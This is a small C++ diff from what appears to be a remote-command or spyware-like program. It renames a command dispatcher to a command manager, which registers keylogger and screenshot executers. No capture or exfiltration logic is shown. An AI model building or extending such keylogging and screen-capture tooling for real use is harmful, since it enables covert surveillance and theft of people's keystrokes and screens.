@@ -27,10 +27,10 @@ utils::builders::BuildKeyloggerExecuter()
     return ( new command::KeyloggerExecuter(2, keylogger) );
 }
 
-command::CommandDispatcher*
-utils::builders::BuildDispatcher()
+command::CommandManager*
+utils::builders::BuildManager()
 {
-    command::CommandDispatcher *dispatcher = new command::CommandDispatcher();
+    command::CommandManager *dispatcher = new command::CommandManager();
 
     dispatcher->Add(BuildScreenshotExecuter());
     dispatcher->Add(BuildKeyloggerExecuter());
